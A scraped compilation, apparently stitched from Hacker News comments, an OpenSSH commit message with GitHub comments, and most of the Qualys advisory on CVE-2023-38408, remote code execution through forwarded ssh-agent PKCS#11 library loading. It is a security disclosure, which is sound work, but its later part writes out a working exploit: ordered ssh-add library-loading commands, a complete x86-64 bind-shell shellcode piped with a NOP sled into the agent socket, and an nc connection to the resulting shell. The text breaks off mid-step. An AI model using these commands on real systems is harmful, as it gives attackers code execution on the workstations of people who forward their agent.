dlcose is supported as one might naively expect, you can still easily run into similar gotchas, like a user loading a module twice under different names. You have to choose either to deal with it the hard way, or disclaim support for such niche cases. | | --- | --- | --- | | | |  |  | [binkHN](user?id=binkHN) [on July 19, 2023](item?id=36790632)   | [prev](#36794006) | [next](#36795342) [â]  Full details: [https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh...](https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh-forwarded-ssh-agent.txt) | | --- | --- | --- | | | |  |  | [quotemstr](user?id=quotemstr) [on July 20, 2023](item?id=36795342)   | [prev](#36790632) | [next](#36800240) [â]  Why in the year of our Lord two thousand and twenty three do we still tolerate loading shared libraries with executable stacks? | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36800240)   | [prev](#36795342) | [next](#36792374) [â]  The suggestion floated in many comments here to create extra keypairs on remote hosts for access to other remotes from the former is a terrible idea.

Basically, if you `ssh -A user@system`, something might be able to execute commands locally. For example, this might turn messy for infrastructures using jump-hosts extensively, if people are used to <ssh -A jumphost> so they can easily <ssh system> afterwards. If you pop the jump host, you could pivot to the workstations with this. At the same time, ssh-agent forwarding makes me queasy from a security perspective even without this. As far as I know, if you <ssh -A> into a system, admins with privileges on the system can gain access to your local ssh-agent already. In the example of the jump host, if you popped the jump host and stuck around for a while, you could probably harvest SSH keys and have some fun later. | | --- | --- | --- | | | |  |  | [spladug](user?id=spladug) [on July 19, 2023](item?id=36790538)   | [root](#36790408) | [parent](#36790504) | [next](#36790521) [â]  FWIW, `ProxyJump` is a safer way to go through a bastion without having to expose your agent to either the bastion or the target host behind it. | | --- | --- | --- | | | |  |  | [tetha](user?id=tetha) [on July 19, 2023](item?id=36790655)   | [root](#36790408) | [parent](#36790538) | [next](#36790620) [â]  Useful, I didn't know that so far.

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Disallow remote addition of FIDO/PKCS11 provider libraries to

ssh-agent by default.

The old behaviour of allowing remote clients from loading providers
can be restored using `ssh-agent -O allow-remote-pkcs11`.

Detection of local/remote clients requires a ssh(1) that supports
the `session-bind@openssh.com` extension. Forwarding access to a
ssh-agent socket using non-OpenSSH tools may circumvent this control.

I have a questionï¼ seems the code above " if (e->nsession\_ids != 0 && !remote\_add\_provider) {...". can avoid entering incorrect logic , however, what if the version of openssh does not have this variable 'nsession\_ids '?(openssh7.4). Can I say that our version is not affectedï¼

Sorry, something went wrong.

Should there be a system-wide configuration file containing a list of
known-good PKCS#11 libraries?  ssh-agent having to guess if something is
a PKCS#11 library is less than awesome.

I reported and tried to fix this in 2012: [https://lore.kernel.org/lkml/f298f914-2239-44e4-8aa1-a51282e7fac0@zmail15.collab.prod.int.phx2.redhat.com/](https://lore.kernel.org/lkml/f298f914-2239-44e4-8aa1-a51282e7fac0%40zmail15.collab.prod.int.phx2.redhat.com/), and more recently made a note about it at <https://rcvalle.com/2020/09/16/rust-exploit-mitigations/#appendix>. This is something I'd really like to see properly fixed. IMO, the READ_IMPLIES_EXEC personality needs to be completely separated from the PT_GNU_STACK program header by having a separate option for it (or setarch -X could just be used whenever READ_IMPLIES_EXEC is needed), and the absence of the PT_GNU_STACK program header needs to have more secure defaults (unrelated to READ_IMPLIES_EXEC).

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fman.openbsd.org%2Fssh-agent.1&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=yjcs4Ynt9Tc6YqjVRROv16ViQw3UbnTsOu4%2FpP6NkMk%3D&reserved=0><<https://man.openbsd.org/ssh-agent.1>>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fman.openbsd.org%2Fssh.1&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=U%2FkLvG5xpW91TcVhA%2FQQkXyDu6xkrFPFzxw%2BJH%2BhX%2FI%3D&reserved=0><<https://man.openbsd.org/ssh.1>>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.qualys.com%2Fresearch%2Fsecurity-advisories%2F&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=%2FMbEJy3RvkLHTGFD6%2F86IiR7qw78xm9XQqA6xOkOoqs%3D&reserved=0><<https://www.qualys.com/research/security-advisories/>> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D1009&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=j6hw2is5FhLWmZ3VfQPPXp%2Bg7VLQlBWEVxYnK%2BSuIyY%3D&reserved=0>):<<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>>

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fseclists.org%2Ffulldisclosure%2F2010%2FOct%2F344&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=%2FbjeLJwIbyFiW3Vo2r9Rj%2Fo6LACJqDegnjxx1zN5JOQ%3D&reserved=0>):<<https://seclists.org/fulldisclosure/2010/Oct/344>>

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

========================================================================

In this section, we present the results of our experiments:

Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F22.04%2Fubuntu-22.04-desktop-amd64.iso&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=Asi2VKNB1zU3PO0i%2B2M%2BotE7IgNbsWyWVKhL2XmAVeY%3D&reserved=0><<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F21.10%2Fubuntu-21.10-desktop-amd64.iso&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=s6Y9CILGTxKnr0Ox53dA8v%2F2OblH63SBJOKvTb91jsE%3D&reserved=0><<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Fubuntu%2F&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=M9UUStPZtnN1Zm6vzhcYoELovmTTib8juOO796aOFXE%3D&reserved=0><<https://old-releases.ubuntu.com/ubuntu/>> impish main restricted universe' > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 912

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-GnpGKph6xbe3/agent.911

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

server# export SSH_AUTH_SOCK=/tmp/ssh-30N8pjTKWn/agent.996

server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
